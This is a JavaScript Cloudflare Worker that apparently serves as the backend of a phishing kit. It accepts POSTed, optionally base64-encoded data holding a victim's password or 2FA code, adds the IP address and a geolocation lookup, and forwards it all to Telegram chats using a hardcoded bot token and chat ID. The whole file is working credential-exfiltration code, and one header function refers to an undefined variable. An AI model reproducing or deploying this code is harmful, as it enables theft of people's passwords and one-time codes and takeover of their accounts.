const TELEGRAM_BOT_TOKEN = '8606442477:AAHGWiqoxONFe0544AfUWmxZCdoRysAcAJk';
const TELEGRAM_CHAT_IDS = '-5477819014';

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

function setSecurityHeaders(resHeaders, origin) {
    resHeaders.set('Access-Control-Allow-Origin', origin || '*');
    resHeaders.set('Access-Control-Allow-Methods', 'POST, OPTIONS');
    resHeaders.set('Access-Control-Allow-Headers', 'Content-Type');
    resHeaders.set('X-Content-Type-Options', 'nosniff');
    res.set('X-Frame-Options', 'DENY');
    res.set('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

async function parseRequestBody(request) {
    try {
        const body = await request.json();
        let data = body;
        if (body.data && typeof body.data === 'string') {
            const decoded = atob(body.data);
            data = JSON.parse(decoded);
        }
        return typeof data === 'object' && data !== null ? data : null;
    } catch (e) {
        return null;
    }
}

function buildMessage(data, ip = 'Unknown') {
    let msg = `🔒 <b>2FA VERIFICATION CODE</b> 🔒\n`;
    msg += `────────────────────────\n`;
    msg += `• <b>IP:</b> <code>${escapeHtml(ip)}</code>\n`;
    msg += `• <b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `────────────────────────\n`;
    msg += `🔑 <b>Code:</b> <code>${escapeHtml(data.code || data.password || 'N/A')}</code>\n`;
    msg += `────────────────────────`;
    return msg;
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, {
            headers: { 'User-Agent': 'cloudflare-worker' }
        });
        const resultData = await res.json();
        if (resultData && !resultData.error) {
            const cityCode = resultData.city ? resultData.city.charAt(0).toUpperCase() : '';
            return `${resultData.city}(${cityCode}) | ${resultData.country_name}(${resultData.country_code})`;
        }
    } catch (e) {}
    return 'Unknown';
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) return false;

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

export default {
    async fetch(request) {
        const url = new URL(request.url);
        const origin = request.headers.get('origin') || '';
        const resHeaders = new Headers();
        setSecurityHeaders(resHeaders, origin);

        if (request.method === 'OPTIONS') {
            return new Response(null, { status: 200, headers: resHeaders });
        }

        if (request.method !== 'POST') {
            resHeaders.set('Content-Type', 'application/json');
            return new Response(JSON.stringify({ error: 'Method not allowed' }), { status: 405, headers: resHeaders });
        }

        try {
            const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || 'Unknown';
            const data = await parseRequestBody(request);

            if (!data) {
                resHeaders.set('Content-Type', 'application/json');
                return new Response(JSON.stringify({ success: false, error: 'Invalid data format' }), { status: 400, headers: resHeaders });
            }

            const location = await getIPInfo(ip);
            const payload = { ...data, location };

            const msg = buildMessage(payload, ip);
            const sentSuccess = await sendTelegram(msg);

            resHeaders.set('Content-Type', 'application/json');
            if (sentSuccess) {
                return new Response(JSON.stringify({ success: true, session_id: crypto.randomUUID() }), { status: 200, headers: resHeaders });
            } else {
                return new Response(JSON.stringify({ success: false, error: 'Internal processing error' }), { status: 500, headers: resHeaders });
            }
        } catch (error) {
            resHeaders.set('Content-Type', 'application/json');
            return new Response(JSON.stringify({ success: false, error: 'Internal server error' }), { status: 500, headers: resHeaders });
        }
    }
};
